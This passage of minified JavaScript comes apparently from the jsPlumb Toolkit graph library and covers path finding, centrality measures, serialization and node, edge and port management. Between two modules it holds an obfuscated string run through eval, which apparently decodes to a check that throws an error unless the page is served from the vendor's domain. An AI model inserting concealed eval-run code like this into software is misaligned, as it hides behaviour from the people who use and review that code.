            return this.findPath(a, b, c).pathDistance
        }, this.getVertex = this.getNode = z, this.setTarget = function (a, b) {
            if (null == (b = z(b))) return {success: !1};
            var c = a.target;
            return a.target.deleteEdge(a), a.target = b, b.addEdge(a), {old: c, edge: a, new: b, success: !0}
        }, this.setSource = function (a, b) {
            if (null == (b = z(b))) return {success: !1};
            var c = a.source;
            return a.source.deleteEdge(a), a.source = b, b.addEdge(a), {old: c, edge: a, new: b, success: !0}
        }, this.printPath = function (a, b) {
            a = z(a), b = z(b);
            for (var c = this.findPath(a, b).path, d = "[" + a.id + " - " + b.id + "] : ", e = 0; e < c.length; e++) d = d + "{ vertex:" + c[e].vertex.id + ", cost:" + c[e].cost + ", edge: " + (c[e].edge && c[e].edge.getId()) + " } ";
            return d
        }, this.getDiameter = function (a) {
            for (var b = 0, c = 0; c < this.vertices.length; c++) for (var d = 0; d < this.vertices.length; d++) if (d != c) {
                var e = p.compute({graph: this, source: this.vertices[c], target: this.vertices[d]});
                if (null == e.path || 0 == e.path.length) {
                    if (!a) return 1 / 0
                } else b = Math.max(b, e.pathDistance)
            }
            return b
        }, this.diameter = this.getDiameter, this.getCentrality = function (a) {
            return a = z(a), (a.getIndegreeCentrality() + a.getOutdegreeCentrality()) / (this.getVertexCount() - 1)
        }, this.getDegreeCentrality = this.getCentrality, this.getIndegreeCentrality = function (a) {
            return a = z(a), a.getIndegreeCentrality() / (this.getVertexCount() - 1)
        }, this.getOutdegreeCentrality = function (a) {
            return a = z(a), a.getOutdegreeCentrality() / (this.getVertexCount() - 1)
        }, this.getCloseness = function (a) {
            return 1 / this.getFarness(a)
        }, this.getFarness = function (a) {
            a = z(a);
            var b = p.compute({graph: this, source: a, target: a, processAll: !0}), c = 0;
            for (var d in b.dist) c += b.dist[d];
            return c / (this.getVertexCount() - 1)
        }, this.getBetweenness = function (a) {
            var b = this.getVertexCount(), c = (b - 1) * (b - 2) / 2, d = 0, e = 0, f = function (a, b, c, d, e) {
                var g = c.parents[a][b];
                if (0 == g.length) {
                    var h = d.slice();
                    h.unshift(a), e.push(h)
                } else for (var i = 0; i < g.length; i++) if (-1 == d.indexOf(g[i][0].id)) {
                    var h = d.slice();
                    h.unshift(g[i][0].id), f(a, g[i][0].id, c, h, e)
                }
            };
            a = z(a);
            var g = o.compute({graph: this, focus: a});
            for (var h in g.paths) for (var i in g.paths[h]) if (h != i) {
                var j = [], k = 0;
                f(h, i, g, [i], j);
                for (var l = 0; l < j.length; l++) {
                    var m = j[l].indexOf(a.id);
                    m > 0 && m < j[l].length - 1 && k++
                }
                d += k / j.length, e += k
            }
            return d / c
        }, this.inspect = function () {
            for (var a = "", b = 0; b < this.vertices.length; b++) a += this.vertices[b].inspect() + "\n";
            return a
        }, this.serialize = function () {
            for (var a, b, c, d, e = {
                nodes: [],
                edges: [],
                ports: [],
                groups: []
            }, f = 0; f < this.vertices.length; f++) {
                a = this.vertices[f], e.nodes.push(a.data), b = a.getAllEdges(), c = a.getPorts();
                for (var g = 0; g < b.length; g++) if (b[g].source == a || "Port" === b[g].source.objectType && b[g].source.getNode() == a) {
                    var h = {source: b[g].source.getFullId(), target: b[g].target.getFullId()};
                    b[g].data && (h.data = b[g].data), e.edges.push(h)
                }
                for (var i = 0; i < c.length; i++) {
                    var j = {};
                    for (var k in c[i].data) j[k] = c[i].data[k];
                    j.id = c[i].getFullId(), e.ports.push(j)
                }
            }
            for (f = 0; f < this.groups.length; f++) {
                d = this.groups[f], e.groups.push(d.data), b = d.getEdges();
                for (var g = 0; g < b.length; g++) if (b[g].source === d) {
                    var h = {source: d.getFullId(), target: b[g].target.getFullId()};
                    b[g].data && (h.data = b[g].data), e.edges.push(h)
                }
            }
            return e
        }, this.getClusters = function () {
            var a, b = [], c = {}, d = function (a, e) {
                if (null != a && !c[a.id]) {
                    null == e ? (e = new k(a), b.push(e)) : e.addVertex(a), c[a.id] = !0;
                    for (var f = a.getAllEdges(), g = 0; g < f.length; g++) {
                        var h = f[g].source === a ? f[g].target : f[g].source;
                        d(h, e)
                    }
                }
            };
            for (a = 0; a < this.vertices.length; a++) d(this.vertices[a]);
            for (a = 0; a < this.groups.length; a++) d(this.groups[a]);
            return b
        }
    }, function (a, b, c, d, e) {
        for (var f = -1, g = null, h = 1 / 0, i = 0; i < a.length; i++) if (!b[i]) {
            var j = e(a[i]);
            j < h && (h = j, f = i, g = a[i])
        }
        return {node: g, index: f}
    }), m = function (a, b) {
        var c = b.getFullId(), d = a[c];
        return null == d && (c = b.getNode ? b.getNode().id : b.id, d = a[c]), null == d ? null : {p: d, id: c}
    }, n = function (a, b, c, d, e, f) {
        for (var g = [], h = d, i = m(b, h); null != i;) g.splice(0, 0, {
            vertex: h,
            cost: a[i.id],
            edge: c[i.id]
        }), h = i.p, i = m(b, h);
        return g.splice(0, 0, {vertex: h, cost: 0, edge: null}), g
    }, o = {
        getPath: function (a, b, c, d) {
            if (a[c.id][d.id] == 1 / 0) return null;
            var e = b[c.id][d.id];
            return null == e ? " " : o.getPath(a, b, c, e) + " " + e.id + " " + o.getPath(a, b, e, d)
        }, getPaths: function (a, b, c, d, e) {
            if (a[c.id][d.id] == 1 / 0) return null;
            var f = b[c.id][d.id];
            return 0 == f.length ? " " : o.getPaths(a, b, c, f[0]) + " " + f[0].id + " " + o.getPaths(a, b, f[0], d)
        }, compute: function (a) {
            var b, c, d, e = a.graph, f = e.getVertexCount(), g = {}, h = {};
            for (b = 0; b < f; b++) {
                var i = e.getVertexAt(b);
                for (g[i.id] || (g[i.id] = {}), h[i.id] || (h[i.id] = {}), g[i.id][i.id] = 0, c = 0; c < f; c++) if (b != c) {
                    var j = e.getVertexAt(c);
                    g[i.id][j.id] || (g[i.id][j.id] = 1 / 0), h[i.id][j.id] || (h[i.id][j.id] = [])
                }
                var k = i.getEdges();
                for (d = 0; d < k.length; d++) k[d].source == i ? g[i.id][k[d].target.id] = k[d].getCost() : (g[k[d].source.id] || (g[k[d].source.id] = {}, h[k[d].source.id] = {}), g[i.id][k[d].source.id] = k[d].getCost())
            }
            for (d = 0; d < f; d++) for (b = 0; b < f; b++) for (c = 0; c < f; c++) if (b != c && c != d && b != d) {
                var l = e.getVertexAt(b).id, m = e.getVertexAt(c).id, n = e.getVertexAt(d).id;
                g[l][n] + g[n][m] <= g[l][m] && g[l][n] + g[n][m] != 1 / 0 && (g[l][m] = g[l][n] + g[n][m], h[l][m] || (h[l][m] = []), h[l][m].unshift([e.getVertexAt(d), g[l][m]]))
            }
            return {paths: g, parents: h}
        }
    }, p = {
        compute: function (a) {
            for (var b = a.graph, c = a.source, d = a.target, e = a.nodeFilter, f = a.edgeFilter, g = {}, h = {}, i = {}, j = {
                dist: g,
                previous: h,
                edges: i,
                path: []
            }, k = a.processAll, m = {}, o = {}, p = !(!1 === a.strict), q = function (a) {
                return a.getFullId ? a.getFullId() : a.id
            }, r = [], s = function (a) {
                var b = o[a.getFullId()];
                return m[b.v.id]
            }, t = function (a, b) {
                var c, d;
                if ("Port" === a.objectType) {
                    for (g[a.getFullId()] = b, c = s(a), d = 0; d < c.length; d++) c[d].p != a && (g[c[d].p.getFullId()] = b + a.getNode().getInternalEdge(a, c[d].p).cost);
                    p || (g[a.getNode().id] = b)
                } else for (g[a.id] = b, c = m[a.id], d = 0; d < c.length; d++) g[c[d].p.getFullId()] = b
            }, u = function (a) {
                return e && !e(a) ? 1 / 0 : g[q(a)]
            }, v = function (a, b, c) {
                if ("Port" === a.objectType) {
                    for (var d = s(a), e = 0; e < d.length; e++) h[d[e].p.getFullId()] = c.node;
                    p || (h[a.getNode().id] = c.node)
                }
                h[b] = c.node
            }, w = function (a, b, c) {
                if ("Port" === a.objectType) {
                    for (var d = s(a), e = 0; e < d.length; e++) i[d[e].p.getFullId()] = c;
                    p || (i[a.getNode().id] = c)
                }
                i[b] = c
            }, x = 0; x < b.vertices.length; x++) {
                var y = b.vertices[x], z = y.getPorts();
                r.push(y);
                var A = {v: y, i: r.length - 1};
                m[y.id] = [], t(y, 1 / 0);
                for (var B = 0; B < z.length; B++) r.push(z[B]), o[z[B].getFullId()] = A, m[y.id].push({
                    p: z[B],
                    i: r.length - 1
                }), t(z[B], 1 / 0)
            }
            if (null == c && (c = b.getVertex(a.sourceId)), null == d && (d = b.getVertex(a.targetId)), null == c || null == d) return j;
            c.getNode && c.getNode(), d.getNode && d.getNode(), t(c, 0);
            for (var C = new Array(b.vertices.length), D = 0, E = function (a, b, c, d) {
                for (var e = 0; e < b.length; e++) {
                    var f = b[e];
                    if (c(f)) {
                        var g = d(f), h = g.tp || g.tn, i = q(h), j = u(a.node) + f.getCost();
                        j < u(h) && (t(h, j), v(h, i, a), w(h, i, f))
                    }
                }
            }; D < r.length;) {
                var F = l(r, C, g, q, u), G = F.node ? q(F.node) : null;
                if (!F.node || u(F.node) == 1 / 0) break;
                if (d && (G == q(d) || !p && F.node.isChildOf && F.node.isChildOf(d)) && (j.path = n(g, h, i, d, q), j.pathDistance = j.path[j.path.length - 1].cost, !k)) break;
                C[F.index] = !0, D += 1, E(F, F.node.getAllEdges(), function (a) {
                    return !(f && !f(a)) && (!a.isDirected() || F.node == a.source || !p && a.source.isChildOf && a.source.isChildOf(F.node))
                }, function (a) {
                    var b = a.source.getNode ? a.source.getNode() : a.source, c = a.source.getNode ? a.source : null,
                        d = a.target.getNode ? a.target.getNode() : a.target, e = a.target.getNode ? a.target : null;
                    return a.source == F.node || !p && a.source.isChildOf && a.source.isChildOf(F.node) ? {
                        tn: d,
                        tp: e
                    } : {tn: b, tp: c}
                })
            }
            return j
        }
    }
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbUtil, c = a.jsPlumb, d = a.jsPlumbToolkitUtil, e = a.jsPlumbGraph, f = "type",
        g = "default", h = function (a) {
            return a.id
        };
    a.jsPlumbToolkitInstance = function (i) {
        i = i || {};
        var j = i.idFunction || h, k = i.typeProperty || f, l = i.edgeTypeProperty || f, m = i.portTypeProperty || f,
            n = i.typeFunction || function (a) {
                return a[k] || g
            }, o = i.edgeIdFunction || j, p = i.edgeTypeFunction || function (a) {
                return a[l] || g
            }, q = i.portIdFunction || j, r = i.portTypeFunction || function (a) {
                return a[m] || g
            }, s = i.portExtractor, t = i.portUpdater, u = i.portDataProperty, v = this, w = !1, x = !1, y = i.model || {},
            z = function (a, c, e) {
                c = null != c && b.isObject(c) ? c : {}, c = b.clone(c), c.id = c.id || d.uuid(), c.type = c.type || (null == a ? null : a.type || a), e(c)
            }, A = i.nodeFactory || z, B = i.edgeFactory || z, C = i.portFactory || z, D = i.groupFactory || z,
            E = i.autoSave && i.saveUrl, F = i.saveUrl, G = i.saveHeaders, H = i.onAutoSaveSuccess || function () {
            }, I = i.onAutoSaveError || function () {
            }, J = !0 === i.doNotUpdateOriginalData, K = i.onBeforeAutoSave || function () {
            }, L = i.onAfterAutoSave || function () {
            }, M = {
                portSeparator: i.portSeparator,
                defaultCost: i.defaultCost,
                defaultDirected: i.defaultDirected,
                enableSubgraphs: i.enableSubgraphs
            }, N = !0 === i.createMissingGroups;
        null != u && null == s && (s = function (a) {
            return a[u] || []
        }), null != u && null == t && (t = function (a, b, c) {
            var d = {};
            return d[u] = jsPlumbToolkitUtil.map(c, function (a) {
                return a.data
            }), jsPlumb.extend(a, d)
        }), b.EventGenerator.apply(this, arguments);
        var O = new e.Graph(M);
        E && new d.AutoSaver(this, F, G, H, I, K, L), new d.CatchAllEventHandler(this), this.getNodeFactory = function () {
            return A
        }, this.getGroupFactory = function () {
            return D
        }, this.getEdgeFactory = function () {
            return B
        }, this.getPortFactory = function () {
            return C
        }, this.setNodeFactory = function (a) {
            A = a
        }, this.setGroupFactory = function (a) {
            D = a
        }, this.setEdgeFactory = function (a) {
            B = a
        }, this.setPortFactory = function (a) {
            C = a
        }, this.setDebugEnabled = function (a) {
            x = a
        }, this.isDebugEnabled = function () {
            return x
        }, this.getModel = function () {
            return y || {}
        };
        var P, Q = function () {
            return null == P && (P = new a.jsPlumbToolkit.Model(y || {})), P
        }, R = function (a, b) {
            if (null == y) return !0;
            var c = this.getType(a), d = this.getType(b), e = Q(), f = a.getNode ? a.getNode() : a,
                g = b.getNode ? b.getNode() : b,
                h = "Node" === a.objectType ? e.getNodeDefinition(c) : e.getPortDefinition(c),
                i = "Node" === b.objectType ? e.getNodeDefinition(d) : e.getPortDefinition(d), j = this.getNodeType(f),
                k = this.getNodeType(g), l = e.getNodeDefinition(j), m = e.getNodeDefinition(k);
            return !(null != h.maxConnections && a.getEdges().length >= h.maxConnections) && (!(null != i.maxConnections && b.getEdges().length >= i.maxConnections) && (a == b ? !(!1 === l.allowLoopback || !1 === h.allowLoopback || !1 === i.allowLoopback || !1 === m.allowLoopback) : f != g || !(!1 === l.allowNodeLoopback || !1 === h.allowNodeLoopback || !1 === i.allowNodeLoopback || !1 === m.allowNodeLoopback)))
        }.bind(this);
        this.beforeConnect = i.beforeConnect || R, this.beforeMoveConnection = i.beforeMoveConnection || R, this.beforeStartConnect = i.beforeStartConnect || function (a, b) {
            return {}
        }, this.beforeDetach = i.beforeDetach || function (a, b, c) {
            return !0
        }, this.beforeStartDetach = i.beforeStartDetach || function (a, b) {
            return !0
        }, this.setSuspendGraph = function (a) {
            w = a
        }, this.setDoNotUpdateOriginalData = function (a) {
            J = a
        }, this.getTypeFunction = function () {
            return n
        }, this.connect = function (a) {
            a = a || {};
            var b;
            if (!w) {
                var d = O.getVertex(a.source), e = O.getVertex(a.target), f = a.cost, g = a.directed;
                if (!d) {
                    if (a.doNotCreateMissingNodes) return;
                    d = O.addVertex(a.source), v.fire("nodeAdded", {data: {}, node: d})
                }
                if (!e) {
                    if (a.doNotCreateMissingNodes) return;
                    e = O.addVertex(a.target), v.fire("nodeAdded", {data: {}, node: e})
                }
                var h = this.beforeStartConnect(d, p(a.data || {}));
                if (h) {
                    var i = a.data || {};
                    "object" == typeof h && c.extend(i, h);
                    !1 !== this.beforeConnect(d, e, i) && (b = O.addEdge({
                        source: d,
                        target: e,
                        cost: f,
                        directed: g,
                        data: i
                    }), v.fire("edgeAdded", {edge: b}))
                }
            }
            return b
        }, this.clear = function () {
            return this.fire("graphClearStart"), O.clear(), this.fire("graphCleared"), this
        }, this.getGraph = function () {
            return O
        }, this.getNodeCount = function () {
            return O.getVertexCount()
        }, this.getNodeAt = function (a) {
            return O.getVertexAt(a)
        }, this.getNodes = function () {
            return O.getVertices()
        }, this.eachNode = function (a) {
            for (var b, c = 0, d = O.getVertexCount(); c < d; c++) b = O.getVertexAt(c), a(c, b)
        }, this.eachGroup = function (a) {
            for (var b, c = 0, d = O.getGroupCount(); c < d; c++) b = O.getGroupAt(c), a(c, b)
        }, this.eachEdge = function (a) {
            for (var b = O.getEdges(), c = 0, d = b.length; c < d; c++) a(c, b[c])
        }, this.getEdgeCount = function () {
            return O.getEdgeCount()
        }, this.getGroupCount = function () {
            return O.getGroupCount()
        }, this.getGroupAt = function (a) {
            return O.getGroupAt(a)
        }, this.getGroups = function () {
            return O.getGroups()
        }, this.getClusters = function () {
            return O.getClusters()
        }, this.getNodeId = function (a) {
            return b.isObject(a) ? j(a) : a
        }, this.getNodeType = function (a) {
            return n(a) || "default"
        }, this.getEdgeId = function (a) {
            return b.isObject(a) ? o(a) : a
        }, this.getEdgeType = function (a) {
            return p(a) || "default"
        }, this.getPortId = function (a) {
            return b.isObject(a) ? q(a) : a
        }, this.getPortType = function (a) {
            return r(a) || "default"
        }, this.getType = function (a) {
            return ("Node" === a.objectType ? n : "Port" === a.objectType ? r : p)(a.data) || "default"
        }, this.setType = function (a, b) {
            var c = this.getType(a);
            if (c !== b) {
                var d = "Node" === a.objectType ? k : "Port" === a.objectType ? m : l,
                    e = a.objectType.charAt(0).toLowerCase() + a.objectType.substring(1) + "TypeChanged";
                a.data[d] = b, this.fire(e, {obj: a, previousType: c, newType: b})
            }
        }, this.addNode = function (b, c, e) {
            var f = j(b);
            null == f && "string" != typeof b && (b.id = d.uuid());
            var g = O.addNode(b, j);
            if (null != g) {
                if (null != s) {
                    var h = s(g.data, g);
                    if (null != h) for (var i = 0; i < h.length; i++) g.addPort(h[i])
                }
                if ("string" != typeof b && null != b.group) {
                    var k = this.getGroup(b.group);
                    null == k && N && (k = O.addGroup(b.group)), null != k && (k.addVertex(g), v.fire("group:addMember", {
                        node: g,
                        group: k
                    }))
                }
                return Y || J || a.jsPlumbToolkitIO.manage("addNode", W, X, g, j || O.getIdFunction(), v), e || v.fire("nodeAdded", {
                    data: b,
                    node: g,
                    eventInfo: c
                }), g
            }
            return O.getNode(f)
        }, this.addFactoryNode = function (a, b, c) {
            b = 2 !== arguments.length || null != arguments[1] && "object" != typeof arguments[1] ? {} : arguments[1], c = 3 === arguments.length ? arguments[2] : "function" == typeof arguments[1] ? arguments[1] : null, b.type = b.type || a, A(a, b, function (a) {
                var b = this.addNode(a);
                c && c(b)
            }.bind(this))
        }, this.addNodes = function (a) {
            for (var b = 0; b < a.length; b++) v.addNode.apply(v, [a[b]]);
            return v
        }, this.addGroup = function (b, c, e) {
            null == j(b) && "string" != typeof b && (b.id = d.uuid());
            var f = O.addGroup(b, j);
            return Y || J || a.jsPlumbToolkitIO.manage("addGroup", W, X, f, j || O.getIdFunction(), v), e || v.fire("groupAdded", {
                data: b,
                group: f,
                eventInfo: c
            }), f
        }, this.addToGroup = function (a, b, c) {
            var d = !1;
            if (a = v.getNode(a), b = v.getGroup(b), a && b && (d = b.addVertex(a))) {
                a.data.group = b.id;
                var e = {node: a, group: this.getGroup(b)};
                c && (e.sourceGroup = c), v.fire("group:addMember", e), v.fire("dataUpdated")
            }
            return d
        }, this.removeFromGroup = function (a, b, c) {
            a = v.getNode(a);
            var d;
            if (a && a.group) {
                if (d = a.group, d.deleteVertex(a), delete a.data.group, !b) {
                    var e = {node: a, group: d};
                    c && (e.targetGroup = c), v.fire("group:removeMember", e)
                }
                v.fire("dataUpdated")
            }
            return d
        }, this.removeGroup = function (b, c, d) {
            var e = v.getObjectInfo(b);
            if (e && e.obj) {
                b = e.obj;
                var f = [];
                Array.prototype.push.apply(f, b.getNodes());
                var g = O.deleteGroup(b, c);
                return g && (Y || J || a.jsPlumbToolkitIO.manage("removeGroup", W, X, g, j || O.getIdFunction(), v), d || v.fire("groupRemoved", {
                    group: g,
                    removeChildNodes: c,
                    nodes: f
                })), v
            }
        }, this.getNode = function (a) {
            return O.getVertex(a)
        }, this.getEdge = function (a) {
            return O.getEdge(a)
        }, this.getGroup = function (a) {
            return O.getGroup(a)
        }, this.exists = function (a) {
            for (var b = 0; b < arguments.length; b++) if (null == O.getVertex(arguments[b])) return !1;
            return !0
        }, this.removeNode = function (b, c) {
            b = b.constructor === e.Vertex || b.constructor === e.Port ? b : O.getVertex(b);
            for (var d = b.getAllEdges() || [], f = 0; f < d.length; f++) v.removeEdge(d[f]);
            return O.deleteVertex(b.id), Y || J || a.jsPlumbToolkitIO.manage("removeNode", W, X, b, j || O.getIdFunction(), v), c || v.fire("nodeRemoved", {
                node: b,
                nodeId: b.id,
                edges: d
            }), v
        }, this.addEdge = function (b, c, d) {
            var e = O.addEdge(b, o, this.beforeConnect);
            return Y || J || a.jsPlumbToolkitIO.manage("addEdge", W, X, e, o || O.getIdFunction(), v), d || v.fire("edgeAdded", {
                edge: e,
                source: c,
                geometry: b.geometry,
                addedByMouse: b.addedByMouse
            }, null), e
        }, this.removeEdge = function (b, c) {
            return b = O.getEdge(b), null != b && (O.deleteEdge(b), Y || J || a.jsPlumbToolkitIO.manage("removeEdge", W, X, b, o || O.getIdFunction(), v), v.fire("edgeRemoved", {
                edge: b,
                source: c
            }, null)), v
        }, this.edgeMoved = function (a, b, c) {
            a[0 === c ? "source" : "target"];
            return this[0 === c ? "setSource" : "setTarget"](a, b)
        }, this.setTarget = function (a, b, c) {
            var d = O.setTarget.apply(O, arguments);
            return !1 === d.success || c || v.fire("edgeTarget", d), d
        }, this.setSource = function (a, b, c) {
            var d = O.setSource.apply(O, arguments);
            return !1 === d.success || c || v.fire("edgeSource", d), d
        }, this.addNewPort = function (b, c, d, e) {
            b = O.getVertex(b), C({node: b, type: c}, d, function (c) {
                var d = q(c), f = b.addPort(d);
                f.data = c, T(b), Y || J || a.jsPlumbToolkitIO.manage("addPort", W, X, {
                    node: b,
                    port: f
                }, q || O.getIdFunction(), v), e || v.fire("portAdded", {node: b, data: c, port: f}, null)
            })
        }, this.addPort = function (b, c, d) {
            var e = b.addPort(c, q);
            return T(b), Y || J || a.jsPlumbToolkitIO.manage("addPort", W, X, {
                node: b,
                port: e
            }, q || O.getIdFunction(), v), d || v.fire("portAdded", {node: b, data: c, port: e}, null), e
        }, this.removePort = function (a, b, c) {
            var d = !1;
            a = a.constructor === e.Vertex || a.constructor === e.Port ? a : O.getVertex(a);
            var f = a.getPort(b);
            if (f) {
                var g = f.getAllEdges();
                if ((d = a.removePort(f)) && !c) {
                    T(a), v.fire("portRemoved", {node: a, port: f, edges: g}, null);
                    for (var h = 0; h < g.length; h++) v.removeEdge(g[h])
                }
            }
            return d
        }, this.remove = function (a) {
            if (null != a) {
                var b = v.getObjectInfo(a);
                v.setSuspendRendering(!0);
                try {
                    if (!b.obj || "Node" !== b.type && "Edge" !== b.type && "Group" !== b.type) {
                        for (; a.getNodeCount() > 0;) v.removeNode(a.getNodeAt(0));
                        for (; a.getEdgeCount() > 0;) v.removeEdge(a.getEdgeAt(0));
                        for (; a.getGroupCount() > 0;) v.removeGroup(a.getGroupAt(0))
                    } else v["remove" + b.type](b.obj)
                } finally {
                    v.setSuspendRendering(!1, !0)
                }
            }
        }, this.setSuspendRendering = function (a, b) {
            for (var c in ea) ea[c].setSuspendRendering(a, b)
        }, this.batch = function (a) {
            v.setSuspendRendering(!0);
            try {
                a()
            } catch (a) {
                jsPlumbUtil.log("Error in transaction " + a)
            } finally {
                v.setSuspendRendering(!1, !0)
            }
        };
        var S = function (a, d, e, f, g) {
            var h = O.getNode(a);
            if (h && h.objectType) {
                var i = c.extend({}, h.data);
                if (d) {
                    for (var j in d) b.replace(h.data, j, d[j]);
                    "Port" === h.objectType && T(h.getNode())
                }
                v.fire(e, f(h, i), null)
            }
        }.bind(this), T = function (a) {
            if (null != t) {
                var b = t(a.data, a, a.getPorts());
                null != b && (a.data = b)
            }
        };
        this.updateGroup = function (a, b) {
            S(a, b, "groupUpdated", function (a, c) {
                return {group: a, updates: b || {}, originalData: c}
            })
        }, this.updateNode = function (a, b) {
            S(a, b, "nodeUpdated", function (a, c) {
                return {node: a, updates: b || {}, originalData: c}
            })
        }, this.updatePort = function (a, b) {
            S(a, b, "portUpdated", function (a, c) {
                return {port: a, node: a.getNode(), updates: b || {}, originalData: c}
            })
        }, this.updateEdge = function (a, d) {
            var e = O.getEdge(a);
            if (e) {
                var f = c.extend({}, e.data);
                if (d) for (var g in d) null == e.data[g] ? e.data[g] = d[g] : b.replace(e.data, g, d[g]);
                v.fire("edgeUpdated", {edge: e, updates: d || {}, originalData: f}, null)
            }
        }, this.update = function (a, c) {
            return b.isString(a) && (a = this.getNode(a)), a && a.objectType && this["update" + a.objectType](a, c), a
        }, this.getPath = function (b) {
            return new a.jsPlumbToolkit.Path(this, b)
        };
        var U = function (a) {
            return null == a ? null : "*" === a ? O : a.constructor === e.Vertex || a.constructor === e.Port ? a : b.isString(a) || b.isObject(a) ? O.getVertex(a) : null
        };
        this.findGraphObject = U;
        var V = function (a, b, c) {
            a = a || {};
            var d = [], f = {}, g = function (a) {
                f[a.getId()] || (d.push(a), f[a.getId()] = !0)
            }, h = function (d, f, h, i) {
